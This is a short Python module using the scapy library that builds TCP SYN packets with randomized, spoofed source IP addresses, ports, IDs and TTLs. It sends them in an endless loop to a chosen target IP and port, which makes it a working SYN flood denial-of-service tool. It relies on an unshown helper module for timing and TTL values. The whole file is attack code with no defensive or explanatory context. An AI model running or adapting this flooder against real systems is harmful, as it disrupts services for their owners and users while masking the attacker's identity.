from scapy.all import IP, TCP, send, RandIP, RandShort
from sys import path
path.append("..")
import packet_builder

def build_syn_packet(destination_IP, destination_port):
    """Generate TCP packet with SYN flag and spoofed source IP address.

    Arguments:
    destination_IP -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent 
    
    """
    return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/TCP(sport=RandShort(), dport=destination_port, ack=RandShort(), window=RandShort(), flags="S")

def start_syn_flood(destination_IP, destination_port):
    """Continuously send TCP SYN requests"""
    try:
        while True:
            send(build_syn_packet(destination_IP, destination_port), inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")